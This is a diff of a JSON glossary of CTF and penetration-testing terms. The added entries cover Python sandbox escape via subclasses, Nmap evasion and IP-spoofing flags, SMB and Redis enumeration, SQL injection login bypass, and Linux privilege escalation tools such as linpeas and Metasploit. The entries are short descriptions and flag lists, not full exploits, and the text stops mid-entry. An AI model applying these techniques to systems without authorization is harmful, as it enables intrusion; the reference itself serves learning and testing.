@@ -20,6 +20,23 @@
       "letter": "P"
     },
     {
+      "term": "405",
+      "description": "Reaches popen without going through os via subclasses",
+      "tags": [
+        "python",
+        "exploitation",
+        "popen",
+        "sandbox-escape"
+      ],
+      "resources": [
+        {
+          "title": "Python Sandbox Bypass",
+          "url": "https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes"
+        }
+      ],
+      "letter": "4"
+    },
+    {
       "term": "as",
       "description": "Attempts to interpret a file as assembly instructions",
       "tags": [
@@ -54,23 +71,6 @@
       "letter": "B"
     },
     {
-      "term": "ln",
-      "description": "Creates a symbolic link to a file; makes it executable and runs it",
-      "tags": [
-        "linux",
-        "file-system",
-        "execution",
-        "command"
-      ],
-      "resources": [
-        {
-          "title": "ln Command Guide",
-          "url": "https://www.geeksforgeeks.org/ln-command-in-linux/"
-        }
-      ],
-      "letter": "L"
-    },
-    {
       "term": "Command Composition",
       "description": "Bypass filters by composing commands from individual characters",
       "tags": [
@@ -85,215 +85,6 @@
         }
       ],
       "letter": "C"
-    },
-    {
-      "term": "__subclasses__",
-      "description": "Allows access to all classes derived from 'object'",
-      "tags": [
-        "python",
-        "exploitation",
-        "sandbox-escape"
-      ],
-      "resources": [
-        {
-          "title": "Python Jailbreak Techniques",
-          "url": "https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes"
-        }
-      ],
-      "letter": "S"
-    },
-    {
-      "term": "get_data",
-      "description": "Important method to access data without os or globals",
-      "tags": [
-        "python",
-        "data-access",
-        "sandbox-escape"
-      ],
-      "resources": [
-        {
-          "title": "Python Code Injection",
-          "url": "https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1"
-        }
-      ],
-      "letter": "G"
-    },
-    {
-      "term": "get_flashed_messages",
-      "description": "Can access globals",
-      "tags": [
-        "python",
-        "flask",
-        "web-exploitation"
-      ],
-      "resources": [
-        {
-          "title": "Flask Documentation",
-          "url": "https://flask.palletsprojects.com/en/2.0.x/api/#flask.get_flashed_messages"
-        }
-      ],
-      "letter": "G"
-    },
-    {
-      "term": "405",
-      "description": "Reaches popen without going through os via subclasses",
-      "tags": [
-        "python",
-        "exploitation",
-        "popen",
-        "sandbox-escape"
-      ],
-      "resources": [
-        {
-          "title": "Python Sandbox Bypass",
-          "url": "https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes"
-        }
-      ],
-      "letter": "4"
-    },
-    {
-      "term": "__mro__",
-      "description": "Method Resolution Order - important in web contexts",
-      "tags": [
-        "python",
-        "oop",
-        "inheritance"
-      ],
-      "resources": [
-        {
-          "title": "Python MRO Explanation",
-          "url": "https://www.geeksforgeeks.org/method-resolution-order-in-python-inheritance/"
-        }
-      ],
-      "letter": "M"
-    },
-    {
-      "term": "Self.help",
-      "description": "Command to get help in restricted environments",
-      "tags": [
-        "python",
-        "jail",
-        "exploitation"
-      ],
-      "resources": [
-        {
-          "title": "Search: Python Jail Self.help",
-          "url": "https://google.com/search?q=python+jail+self.help"
-        }
-      ],
-      "letter": "S"
-    },
-    {
-      "term": "Nested Jails",
-      "description": "Call jail within jail to get more space; define abbreviations with variables",
-      "tags": [
-        "python",
-        "jail",
-        "exploitation"
-      ],
-      "resources": [
-        {
-          "title": "Search: Python Nested Jail",
-          "url": "https://google.com/search?q=python+jail+nested+jail"
-        }
-      ],
-      "letter": "N"
-    },
-    {
-      "term": "Type Casting",
-      "description": "Cast to wrong type to trigger error output",
-      "tags": [
-        "python",
-        "error-handling",
-        "exploitation"
-      ],
-      "resources": [
-        {
-          "title": "Python Exceptions",
-          "url": "https://docs.python.org/3/tutorial/errors.html"
-        }
-      ],
-      "letter": "T"
-    },
-    {
-      "term": "Globals Update",
-      "description": "Create/update global variables for exploitation",
-      "tags": [
-        "python",
-        "variables",
-        "exploitation"
-      ],
-      "resources": [
-        {
-          "title": "Python globals()",
-          "url": "https://docs.python.org/3/library/functions.html#globals"
-        }
-      ],
-      "letter": "G"
-    },
-    {
-      "term": "Command Composition (JS)",
-      "description": "Express commands in hex/int formats",
-      "tags": [
-        "javascript",
-        "obfuscation",
-        "encoding"
-      ],
-      "resources": [
-        {
-          "title": "JS Obfuscation",
-          "url": "https://obfuscator.io/"
-        }
-      ],
-      "letter": "C"
-    },
-    {
-      "term": "JSON.stringify",
-      "description": "Converts JavaScript values to JSON strings",
-      "tags": [
-        "javascript",
-        "serialization",
-        "data-manipulation"
-      ],
-      "resources": [
-        {
-          "title": "MDN JSON.stringify",
-          "url": "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/stringify"
-        }
-      ],
-      "letter": "J"
-    },
-    {
-      "term": "Prototype Pollution",
-      "description": "Modification of Object.prototype",
-      "tags": [
-        "javascript",
-        "object-model",
-        "web-security"
-      ],
-      "resources": [
-        {
-          "title": "Prototype Pollution Guide",
-          "url": "https://github.com/BlackFan/client-side-prototype-pollution"
-        }
-      ],
-      "letter": "P"
-    },
-    {
-      "term": "Godbolt",
-      "description": "Online compiler explorer",
-      "tags": [
-        "compiler",
-        "debugging",
-        "code-analysis"
-      ],
-      "resources": [
-        {
-          "title": "Godbolt",
-          "url": "https://godbolt.org/"
-        }
-      ],
-      "letter": "G"
     },
     {
       "term": "CppInsights",
@@ -312,38 +103,6 @@
       "letter": "C"
     },
     {
-      "term": "GOT",
-      "description": "Global Offset Table - table for addresses of external functions",
-      "tags": [
-        "binary",
-        "elf",
-        "linking"
-      ],
-      "resources": [
-        {
-          "title": "GOT/PLT Explanation",
-          "url": "https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html"
-        }
-      ],
-      "letter": "G"
-    },
-    {
-      "term": "PIE",
-      "description": "Position Independent Executable - can run at any address",
-      "tags": [
-        "binary",
-        "aslr",
-        "security"
-      ],
-      "resources": [
-        {
-          "title": "PIE Introduction",
-          "url": "https://ir0nstone.gitbook.io/notes/types/stack/aslr/pie"
-        }
-      ],
-      "letter": "P"
-    },
-    {
       "term": "ELF",
       "description": "Executable and Linkable Format - standard file format for Linux executables",
       "tags": [
@@ -358,38 +117,6 @@
         }
       ],
       "letter": "E"
-    },
-    {
-      "term": "printf Exploitation",
-      "description": "Format string attacks using printf",
-      "tags": [
-        "format-string",
-        "vulnerability",
-        "exploitation"
-      ],
-      "resources": [
-        {
-          "title": "LiveOverflow",
-          "url": "https://www.youtube.com/watch?v=0WvrSfcdq1I"
-        }
-      ],
-      "letter": "P"
-    },
-    {
-      "term": "Stack Architecture",
-      "description": "Stack manipulation fundamentals",
-      "tags": [
-        "memory-corruption",
-        "buffer-overflow",
-        "exploitation"
-      ],
-      "resources": [
-        {
-          "title": "Stack Overflow Explanation",
-          "url": "https://ir0nstone.gitbook.io/notes/types/stack/basic-buffer-overflow"
-        }
-      ],
-      "letter": "S"
     },
     {
       "term": "Format String",
@@ -408,36 +135,238 @@
       "letter": "F"
     },
     {
-      "term": "%n Format",
-      "description": "Writing to memory using printf",
+      "term": "GOT",
+      "description": "Global Offset Table - table for addresses of external functions",
+      "tags": [
+        "binary",
+        "elf",
+        "linking"
+      ],
+      "resources": [
+        {
+          "title": "GOT/PLT Explanation",
+          "url": "https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html"
+        }
+      ],
+      "letter": "G"
+    },
+    {
+      "term": "Godbolt",
+      "description": "Online compiler explorer",
+      "tags": [
+        "compiler",
+        "debugging",
+        "code-analysis"
+      ],
+      "resources": [
+        {
+          "title": "Godbolt",
+          "url": "https://godbolt.org/"
+        }
+      ],
+      "letter": "G"
+    },
+    {
+      "term": "grep",
+      "description": "A command-line utility for searching plain-text data sets for lines that match a regular expression.",
+      "tags": [
+        "linux",
+        "command",
+        "text-processing",
+        "regex",
+        "builtin"
+      ],
+      "resources": [
+        {
+          "title": "grep man page",
+          "url": "https://man7.org/linux/man-pages/man1/grep.1.html"
+        },
+        {
+          "title": "DigitalOcean - Grep Tutorial",
+          "url": "https://www.digitalocean.com/community/tutorials/grep-command-in-linux-unix"
+        }
+      ],
+      "letter": "G"
+    },
+    {
+      "term": "JSFuck",
+      "description": "An esoteric JavaScript programming style where code is written using only six characters: [, ], (, ), !, and +. It can be used to create obfuscated JavaScript code that is still executable.",
+      "tags": [
+        "javascript",
+        "obfuscation",
+        "esoteric-language",
+        "web-security"
+      ],
+      "resources": [
+        {
+          "title": "JSFuck - Official Site (Encoder)",
+          "url": "http://www.jsfuck.com/"
+        },
+        {
+          "title": "Wikipedia - JSFuck",
+          "url": "https://en.wikipedia.org/wiki/JSFuck"
+        }
+      ],
+      "letter": "J"
+    },
+    {
+      "term": "Jailbreak / Sandbox Escape",
+      "description": "The process of bypassing restrictions or limitations imposed by a sandboxed environment or a restricted shell (jail) to gain unauthorized access or execute arbitrary commands.",
+      "tags": [
+        "exploitation",
+        "security",
+        "sandbox",
+        "privilege-escalation"
+      ],
+      "resources": [
+        {
+          "title": "OWASP - Sandbox Escape",
+          "url": "https://owasp.org/www-community/attacks/Sandbox_Escape"
+        },
+        {
+          "title": "HackTricks - Bypass Sandboxes",
+          "url": "https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions"
+        }
+      ],
+      "letter": "J"
+    },
+    {
+      "term": "ln",
+      "description": "Creates a symbolic link to a file; makes it executable and runs it",
+      "tags": [
+        "linux",
+        "file-system",
+        "execution",
+        "command"
+      ],
+      "resources": [
+        {
+          "title": "ln Command Guide",
+          "url": "https://www.geeksforgeeks.org/ln-command-in-linux/"
+        }
+      ],
+      "letter": "L"
+    },
+    {
+      "term": "linpeas",
+      "description": "A powerful automated script for Linux privilege escalation enumeration. Scans for misconfigurations, credentials, SUID binaries, and more.",
+      "tags": [
+        "PrivilegeEscalation",
+        "Enumeration",
+        "Linux",
+        "Automation"
+      ],
+      "flags": [
+        "chmod +x linpeas.sh (make executable)",
+        "./linpeas.sh (run script)"
+      ],
+      "resources": [
+        {
+          "title": "LinPEAS GitHub",
+          "url": "https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS"
+        },
+        {
+          "title": "HackTricks: Linux Privilege Escalation",
+          "url": "https://book.hacktricks.xyz/linux-hardening/privilege-escalation"
+        },
+        {
+          "title": "TryHackMe Linux PrivEsc Room",
+          "url": "https://tryhackme.com/room/linuxprivesc"
+        }
+      ],
+      "letter": "L"
+    },
+    {
+      "term": "Metasploit Framework",
+      "description": "A comprehensive penetration testing platform with hundreds of exploits, payloads, and auxiliary modules. Used for exploitation, post-exploitation, and automation.",
+      "tags": [
+        "Exploitation",
+        "PostExploitation",
+        "Automation",
+        "Framework"
+      ],
+      "flags": [
+        "msfconsole (interactive shell)",
+        "search <module> (find modules)",
+        "use <module> (select module)",
+        "set <option> (set options)",
+        "run / exploit (execute module)"
+      ],
+      "resources": [
+        {
+          "title": "Metasploit Unleashed Training",
+          "url": "https://www.offensive-security.com/metasploit-unleashed/"
+        },
+        {
+          "title": "Metasploit Documentation",
+          "url": "https://docs.rapid7.com/metasploit/"
+        },
+        {
+          "title": "TryHackMe Metasploit Room",
+          "url": "https://tryhackme.com/room/rpmetasploit"
+        }
+      ],
+      "letter": "M"
+    },
+    {
+      "term": "PIE",
+      "description": "Position Independent Executable - can run at any address",
+      "tags": [
+        "binary",
+        "aslr",
+        "security"
+      ],
+      "resources": [
+        {
+          "title": "PIE Introduction",
+          "url": "https://ir0nstone.gitbook.io/notes/types/stack/aslr/pie"
+        }
+      ],
+      "letter": "P"
+    },
+    {
+      "term": "printf Exploitation",
+      "description": "Format string attacks using printf",
       "tags": [
         "format-string",
-        "memory-writing",
+        "vulnerability",
         "exploitation"
       ],
       "resources": [
         {
-          "title": "Format String Attacks",
-          "url": "https://owasp.org/www-community/attacks/Format_string_attack"
+          "title": "LiveOverflow",
+          "url": "https://www.youtube.com/watch?v=0WvrSfcdq1I"
         }
       ],
-      "letter": "%"
+      "letter": "P"
     },
     {
-      "term": "Heap Architecture",
-      "description": "Heap memory basics and exploitation",
+      "term": "redis-cli",
+      "description": "A command-line interface for interacting with Redis databases. Used for enumeration, key retrieval, and exploitation of misconfigured Redis instances.",
       "tags": [
-        "memory-corruption",
-        "exploitation",
-        "binary"
+        "Redis",
+        "DatabaseEnumeration",
+        "KeyValueStore",
+        "Exploitation"
+      ],
+      "flags": [
+        "-h <host> (target host)",
+        "-p <port> (target port)",
+        "select <db> (select database)",
+        "KEYS * (list all keys)",
+        "GET <key> (retrieve value)"
       ],
       "resources": [
         {
-          "title": "Heap Exploitation",
-          "url": "https://heap-exploitation.dhavalkapil.com/"
+          "title": "Redis CLI Documentation",
+          "url": "https://redis.io/docs/manual/cli/"
+        },
+        {
+          "title": "HackTricks: Redis Exploitation",
+          "url": "https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis"
         }
       ],
-      "letter": "H"
+      "letter": "R"
     },
     {
       "term": "ROT Cipher",
@@ -479,28 +408,6 @@
       "letter": "C"
     },
     {
-      "term": "tr",
-      "description": "A command-line utility for translating or deleting characters. Often used for simple character substitutions, including ROT13.",
-      "tags": [
-        "linux",
-        "command",
-        "builtin",
-        "text-manipulation",
-        "encoding"
-      ],
-      "resources": [
-        {
-          "title": "tr man page",
-          "url": "https://man7.org/linux/man-pages/man1/tr.1.html"
-        },
-        {
-          "title": "ROT13 using tr command",
-          "url": "https://www.google.com/search?q=rot13+tr+command"
-        }
-      ],
-      "letter": "T"
-    },
-    {
       "term": "Vigenere Cipher",
       "description": "A method of encrypting alphabetic text by using a series of different Caesar ciphers based on the letters of a keyword.",
       "tags": [
@@ -520,71 +427,6 @@
         }
       ],
       "letter": "V"
-    },
-    {
-      "term": "grep",
-      "description": "A command-line utility for searching plain-text data sets for lines that match a regular expression.",
-      "tags": [
-        "linux",
-        "command",
-        "text-processing",
-        "regex",
-        "builtin"
-      ],
-      "resources": [
-        {
-          "title": "grep man page",
-          "url": "https://man7.org/linux/man-pages/man1/grep.1.html"
-        },
-        {
-          "title": "DigitalOcean - Grep Tutorial",
-          "url": "https://www.digitalocean.com/community/tutorials/grep-command-in-linux-unix"
-        }
-      ],
-      "letter": "G"
-    },
-    {
-      "term": "awk",
-      "description": "A versatile programming language designed for text processing and typically used as a data extraction and reporting tool.",
-      "tags": [
-        "linux",
-        "command",
-        "text-processing",
-        "scripting"
-      ],
-      "resources": [
-        {
-          "title": "awk man page",
-          "url": "https://man7.org/linux/man-pages/man1/awk.1.html"
-        },
-        {
-          "title": "GNU Awk User's Guide",
-          "url": "https://www.gnu.org/software/gawk/manual/gawk.html"
-        }
-      ],
-      "letter": "A"
-    },
-    {
-      "term": "sed",
-      "description": "A stream editor for performing basic text transformations on an input stream (a file or input from a pipeline).",
-      "tags": [
-        "linux",
-        "command",
-        "text-processing",
-        "scripting",
-        "builtin"
-      ],
-      "resources": [
-        {
-          "title": "sed man page",
-          "url": "https://man7.org/linux/man-pages/man1/sed.1.html"
-        },
-        {
-          "title": "GNU sed manual",
-          "url": "https://www.gnu.org/software/sed/manual/sed.html"
-        }
-      ],
-      "letter": "S"
     },
     {
       "term": "curl",
@@ -608,150 +450,645 @@
       "letter": "C"
     },
     {
-      "term": "nmap",
-      "description": "A free and open-source network scanner used to discover hosts and services on a computer network by sending packets and analyzing the responses.",
+      "term": "Nmap",
+      "description": "A powerful open-source network scanner used for port scanning, service/version detection, OS fingerprinting, firewall evasion, and more. Widely used in penetration testing and security research. Nmap supports a wide range of flags and techniques for enumeration, evasion, and performance tuning.",
       "tags": [
-        "networking",
-        "security",
-        "scanning",
-        "command"
+        "Enumeration",
+        "PortScanning",
+        "ServiceDetection",
+        "FirewallEvasion",
+        "Performance",
+        "OSDetection",
+        "Debugging",
+        "NSE",
+        "Tool",
+        "Networking",
+        "Web"
+      ],
+      "flags": [
+        "-sS (SYN scan, stealthy)",
+        "-sC (default scripts)",
+        "-sV (version detection)",
+        "-A (aggressive: -sC -sV -O --traceroute)",
+        "-O (OS detection)",
+        "-p- (all ports)",
+        "-Pn (treat all hosts as online, disables ping, useful for evasion when ICMP is blocked)",
+        "--source-port (set source port, useful for firewall evasion, e.g., 53 for DNS)",
+        "-T4 (aggressive timing)",
+        "--version-intensity (control version scan speed; lower values for faster, less thorough scans)",
+        "--packet-trace (show all packets sent/received, useful for debugging and firewall analysis)"
+      ],
+      "techniques": [
+        "TTL OS Fingerprinting: Infer the target OS by analyzing TTL values in responses.",
+        "NSE Script Optimization: Run NSE scripts only on discovered open ports for speed.",
+        "ETC (Estimated Time of Completion): Nmap displays ETC for scans, which can fluctuate based on network conditions and scan complexity.",
+        "IP Spoofing: Forge the source IP address to bypass network restrictions or appear as a different host during scanning.",
+        "Data-Length ICMP Probing: Send ICMP echo requests with varying data lengths and analyze responses for OS fingerprinting.",
+        "http-enum NSE Script: Enumerate common web resources and directories on web servers using the NSE script."
       ],
       "resources": [
-        {
-          "title": "Nmap Official Site",
-          "url": "https://nmap.org/"
-        },
-        {
-          "title": "Nmap Network Scanning (Book)",
-          "url": "https://nmap.org/book/"
-        }
+        { "title": "Nmap Documentation", "url": "https://nmap.org/book/man.html" },
+        { "title": "Nmap Cheat Sheet", "url": "https://www.stationx.net/nmap-cheat-sheet/" },
+        { "title": "Nmap Port Scanning Techniques", "url": "https://nmap.org/book/man-bypass-firewalls-ids.html" },
+        { "title": "Nmap Version Detection", "url": "https://nmap.org/book/vscan.html" },
+        { "title": "Nmap Performance Tips", "url": "https://nmap.org/book/performance.html" },
+        { "title": "Nmap Packet Trace", "url": "https://nmap.org/book/man-bypass-firewalls-ids.html#man-packet-trace" },
+        { "title": "Nmap OS Detection", "url": "https://nmap.org/book/osdetect.html" },
+        { "title": "Nmap Scripting Engine", "url": "https://nmap.org/book/nse-usage.html" },
+        { "title": "Nmap IP Spoofing", "url": "https://nmap.org/book/man-bypass-firewalls-ids.html#man-spoof-ip" },
+        { "title": "ICMP OS Fingerprinting", "url": "https://www.blackhat.com/presentations/bh-usa-04/bh-us-04-biondi.pdf" },
+        { "title": "Nmap http-enum Script", "url": "https://nmap.org/nsedoc/scripts/http-enum.html" }
       ],
       "letter": "N"
     },
     {
-      "term": "POST Method",
-      "description": "The HTTP POST method sends data to the server. The type of the body of the request is indicated by the Content-Type header. Often used for submitting forms or uploading files.",
+      "term": "smbclient",
+      "description": "A command-line SMB/CIFS client for accessing Windows shares, listing shares, and transferring files. Useful for enumeration and exploitation of SMB services.",
       "tags": [
-        "http",
-        "web",
-        "networking",
-        "request-method"
+        "SMB",
+        "Enumeration",
+        "FileTransfer",
+        "Tool"
+      ],
+      "flags": [
+        "-L <host> (list shares)",
+        "//<host>/<share> (connect to share)",
+        "-N (no password)",
+        "-U <user> (specify username)"
       ],
       "resources": [
         {
-          "title": "MDN - POST",
-          "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/POST"
+          "title": "smbclient Man Page",
+          "url": "https://www.samba.org/samba/docs/current/man-html/smbclient.1.html"
         },
         {
-          "title": "Burp Suite",
-          "url": "https://portswigger.net/burp"
+          "title": "HackTricks: SMB Enumeration",
+          "url": "https://book.hacktricks.xyz/network-services-pentesting/smb/smb-enumeration"
+        }
+      ],
+      "letter": "S"
+    },
+    {
+      "term": "Anonymous SMB Access",
+      "description": "Accessing SMB shares without authentication. Can reveal sensitive files if shares are misconfigured for public access.",
+      "tags": [
+        "SMB",
+        "Enumeration",
+        "Misconfiguration",
+        "AttackVector"
+      ],
+      "resources": [
+        {
+          "title": "HackTricks: SMB Anonymous Access",
+          "url": "https://book.hacktricks.xyz/network-services-pentesting/smb/smb-enumeration#anonymous-login"
+        }
+      ],
+      "letter": "A"
+    },
+    {
+      "term": "Plugin Exploit",
+      "description": "A class of vulnerabilities affecting plugins or extensions in platforms like WordPress, Joomla, Drupal, and others. Exploitation can lead to file read, upload, or remote code execution. Tools like Metasploit, WPScan, and Searchsploit are commonly used to identify and exploit vulnerable plugins.",
+      "tags": [
+        "Plugin",
+        "Vulnerability",
+        "CMS",
+        "Web",
+        "Exploit",
+        "Metasploit",
+        "Tool"
+      ],
+      "resources": [
+        { "title": "WPScan Home", "url": "https://wpscan.com/" },
+        { "title": "Exploit-DB: Plugins", "url": "https://www.exploit-db.com/search?type=wordpress,joomla,drupal" },
+        { "title": "Metasploit Modules for CMS", "url": "https://www.rapid7.com/db/modules/?q=plugin" }
+      ],
+      "letter": "P"
+    },
+    {
+      "term": "WordPress Plugin Exploits",
+      "description": "A class of vulnerabilities affecting WordPress plugins, often leading to file read, upload, or remote code execution. Exploitation is commonly performed using tools like WPScan, Searchsploit, and Metasploit modules.",
+      "tags": [
+        "WordPress",
+        "Vulnerability",
+        "Plugin",
+        "AttackVector"
+      ],
+      "resources": [
+        {
+          "title": "WPScan Home",
+          "url": "https://wpscan.com/"
+        },
+        {
+          "title": "Exploit-DB: WordPress",
+          "url": "https://www.exploit-db.com/search?port=&type=wordpress"
+        },
+        {
+          "title": "Plugin Exploit Reference",
+          "url": "#/plugin-exploit"
+        }
+      ],
+      "letter": "W"
+    },
+    {
+      "term": "Command Obfuscation",
+      "description": "A technique used by attackers to bypass filters and detection by composing commands from individual characters, using encoding, hex, or other obfuscation methods. Applies to bash, JavaScript, and other scripting languages.",
+      "tags": [
+        "Obfuscation",
+        "CommandInjection",
+        "Bypass",
+        "Technique"
+      ],
+      "resources": [
+        {
+          "title": "OWASP Obfuscation",
+          "url": "https://owasp.org/www-community/Obfuscation"
+        }
+      ],
+      "letter": "C"
+    },
+    {
+      "term": "CMS Exploitation",
+      "description": "A general class of attacks targeting Content Management Systems (CMS) such as WordPress, Joomla, Drupal, and GetSimple CMS. Exploitation often involves known vulnerabilities, weak plugins, or misconfigurations. Tools like Metasploit and Searchsploit are commonly used.",
+      "tags": [
+        "CMS",
+        "Web",
+        "Vulnerability",
+        "AttackVector"
+      ],
+      "resources": [
+        {
+          "title": "Exploit-DB: CMS",
+          "url": "https://www.exploit-db.com/search?type=cms"
+        },
+        {
+          "title": "Metasploit Modules for CMS",
+          "url": "https://www.rapid7.com/db/modules/?q=cms"
+        }
+      ],
+      "letter": "C"
+    },
+    {
+      "term": "Python pty Shell Upgrade",
+      "description": "A technique to upgrade a basic shell to a fully interactive TTY using Python's pty module, improving usability for post-exploitation.",
+      "tags": [
+        "PostExploitation",
+        "Shell",
+        "Linux",
+        "Technique"
+      ],
+      "resources": [
+        {
+          "title": "Upgrading Shells with Python pty",
+          "url": "https://netsec.ws/?p=337"
         }
       ],
       "letter": "P"
     },
     {
-      "term": "GET Method",
-      "description": "The HTTP GET method requests a representation of the specified resource. Requests using GET should only retrieve data and should have no other effect.",
+      "term": "LinEnum",
+      "description": "An automated script for Linux privilege escalation enumeration. Scans for misconfigurations, SUID binaries, credentials, and more.",
       "tags": [
-        "http",
-        "web",
-        "networking",
-        "request-method"
+        "Linux",
+        "PrivilegeEscalation",
+        "Enumeration",
+        "Tool"
       ],
       "resources": [
         {
-          "title": "MDN - GET",
-          "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/GET"
-        },
+          "title": "LinEnum GitHub",
+          "url": "https://github.com/rebootuser/LinEnum"
+        }
+      ],
+      "letter": "L"
+    },
+    {
+      "term": "SUID (Set User ID)",
+      "description": "A Unix file permission that allows users to run an executable with the permissions of the file owner. Often abused for privilege escalation.",
+      "tags": [
+        "Linux",
+        "PrivilegeEscalation",
+        "Permissions",
+        "CTF"
+      ],
+      "resources": [
         {
-          "title": "Burp Suite",
-          "url": "https://portswigger.net/burp"
+          "title": "GTFOBins - SUID",
+          "url": "https://gtfobins.github.io/gtfobins/suid/"
+        }
+      ],
+      "letter": "S"
+    },
+    {
+      "term": "Kernel Exploit",
+      "description": "A privilege escalation technique that exploits vulnerabilities in the operating system kernel to gain root access.",
+      "tags": [
+        "Linux",
+        "PrivilegeEscalation",
+        "Exploit",
+        "CTF"
+      ],
+      "resources": [
+        {
+          "title": "Linux Kernel Exploits",
+          "url": "https://www.exploit-db.com/exploits/linux/local/"
+        }
+      ],
+      "letter": "K"
+    },
+    {
+      "term": "Cron Job Exploitation",
+      "description": "A privilege escalation technique that abuses misconfigured or world-writable cron jobs to execute arbitrary code as a privileged user.",
+      "tags": [
+        "Linux",
+        "PrivilegeEscalation",
+        "Cron",
+        "CTF",
+        "Technique"
+      ],
+      "resources": [
+        {
+          "title": "HackTricks - Cron Job Exploitation",
+          "url": "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/cronjobs"
+        }
+      ],
+      "letter": "C"
+    },
+    {
+      "term": "SSH",
+      "description": "Secure Shell (SSH) is a protocol for secure remote login and command execution over an encrypted connection. Widely used for server administration, file transfer (SCP/SFTP), and tunneling. Common attack vectors include brute-force, key-based authentication attacks, and misconfiguration exploitation.",
+      "tags": [
+        "RemoteAccess",
+        "Encryption",
+        "Authentication",
+        "Linux",
+        "Tool",
+        "Protocol",
+        "Tunneling",
+        "FileTransfer"
+      ],
+      "flags": [
+        "-i <identity_file> (specify private key)",
+        "-p <port> (specify port)",
+        "-L <local_port>:<remote_host>:<remote_port> (local port forwarding)",
+        "-R <remote_port>:<local_host>:<local_port> (remote port forwarding)",
+        "-N (no command, just tunnel)",
+        "-T (disable pseudo-tty allocation)",
+        "-o (set SSH options, e.g., StrictHostKeyChecking=no)"
+      ],
+      "techniques": [
+        "SSH Tunneling: Forwarding ports securely over SSH.",
+        "Key-based Authentication: Using SSH keys for secure login.",
+        "Brute-force Attacks: Attempting to guess passwords or keys.",
+        "SSH Agent Forwarding: Forwarding authentication agent connection for chained logins."
+      ],
+      "resources": [
+        { "title": "OpenSSH Manual", "url": "https://man.openbsd.org/ssh" },
+        { "title": "SSH Port Forwarding", "url": "https://www.ssh.com/academy/ssh/tunneling/example" },
+        { "title": "SSH Key Authentication", "url": "https://www.ssh.com/academy/ssh/key" },
+        { "title": "SSH Security Best Practices", "url": "https://infosec.mozilla.org/guidelines/openssh.html" }
+      ],
+      "letter": "S"
+    },
+    {
+      "term": "SQL",
+      "description": "Structured Query Language (SQL) is used to manage and query relational databases such as MySQL, MariaDB, PostgreSQL, and SQL Server. Common attack vectors include SQL injection, authentication bypass, and privilege escalation via misconfigurations. Tools: sqlmap, MySQL client, MariaDB client, psql, etc.",
+      "tags": [
+        "Database",
+        "MySQL",
+        "MariaDB",
+        "PostgreSQL",
+        "SQLServer",
+        "AuthenticationBypass",
+        "PrivilegeEscalation",
+        "Injection",
+        "Tool",
+        "Technique"
+      ],
+      "flags": [
+        "--skip-ssl (MySQL/MariaDB SSL bypass)",
+        "--ssl-mode=DISABLED (MySQL/MariaDB SSL bypass)",
+        "-u <user> (specify user)",
+        "-p <password> (specify password)"
+      ],
+      "techniques": [
+        "SQL Injection (SQLi): Injecting malicious SQL statements to manipulate or extract data.",
+        "Authentication Bypass: Using SQL comments (e.g., #, -- ) to bypass login checks.",
+        "User Enumeration: Listing users and privileges to find weak accounts.",
+        "Wildcard Host (%): Allowing connections from any IP, often a misconfiguration.",
+        "Anonymous Root Access: Root user can connect without a password due to misconfiguration."
+      ],
+      "resources": [
+        { "title": "OWASP SQL Injection", "url": "https://owasp.org/www-community/attacks/SQL_Injection" },
+        { "title": "MySQL Default Accounts", "url": "https://dev.mysql.com/doc/refman/8.0/en/default-accounts.html" },
+        { "title": "MySQL User Enumeration", "url": "https://book.hacktricks.xyz/network-services-pentesting/3306-pentesting-mysql#user-enumeration" },
+        { "title": "MySQL SSL Options", "url": "https://dev.mysql.com/doc/refman/8.0/en/ssl-options.html" },
+        { "title": "MySQL Host Values", "url": "https://dev.mysql.com/doc/refman/8.0/en/connection-access.html" }
+      ],
+      "letter": "S"
+    },
+    {
+      "term": "Ghidra",
+      "description": "A free and open-source reverse engineering tool developed by the NSA, used for decompiling and analyzing binaries.",
+      "tags": [
+        "ReverseEngineering",
+        "Tool"
+      ],
+      "resources": [
+        {
+          "title": "Ghidra Home",
+          "url": "https://ghidra-sre.org/"
         }
       ],
       "letter": "G"
     },
     {
-      "term": "Burp Suite",
-      "description": "An integrated platform for performing security testing of web applications. Its various tools work seamlessly together to support the entire testing process, from initial mapping and analysis of an application's attack surface, through to finding and exploiting security vulnerabilities.",
+      "term": "Z3 (Constraint Solver)",
+      "description": "A high-performance theorem prover and constraint solver from Microsoft Research, used for symbolic execution and solving complex constraints.",
       "tags": [
-        "web-security",
-        "tool",
-        "proxy",
-        "vulnerability-scanning",
-        "exploitation"
+        "ReverseEngineering",
+        "Solver",
+        "Tool"
       ],
       "resources": [
         {
-          "title": "PortSwigger - Burp Suite",
-          "url": "https://portswigger.net/burp"
-        },
-        {
-          "title": "Burp Suite Documentation",
-          "url": "https://portswigger.net/burp/documentation"
+          "title": "Z3 GitHub",
+          "url": "https://github.com/Z3Prover/z3"
         }
       ],
-      "letter": "B"
+      "letter": "Z"
     },
     {
-      "term": "Obfuscation",
-      "description": "The practice of making something difficult to understand. In computing, code obfuscation is often used to conceal its purpose (e.g., malware) or to deter reverse engineering.",
+      "term": "Angr (Symbolic Execution Tool)",
+      "description": "A Python framework for analyzing binaries using symbolic execution, often used in CTFs for automated exploit generation and reverse engineering.",
       "tags": [
-        "security",
-        "reverse-engineering",
-        "malware",
-        "anti-analysis"
+        "ReverseEngineering",
+        "SymbolicExecution",
+        "Tool"
       ],
       "resources": [
         {
-          "title": "Wikipedia - Obfuscation",
-          "url": "https://en.wikipedia.org/wiki/Obfuscation_(software)"
-        },
-        {
-          "title": "OWASP - Obfuscation",
-          "url": "https://owasp.org/www-community/Obfuscation"
+          "title": "Angr Home",
+          "url": "https://angr.io/"
         }
       ],
-      "letter": "O"
+      "letter": "A"
     },
     {
-      "term": "Jailbreak / Sandbox Escape",
-      "description": "The process of bypassing restrictions or limitations imposed by a sandboxed environment or a restricted shell (jail) to gain unauthorized access or execute arbitrary commands.",
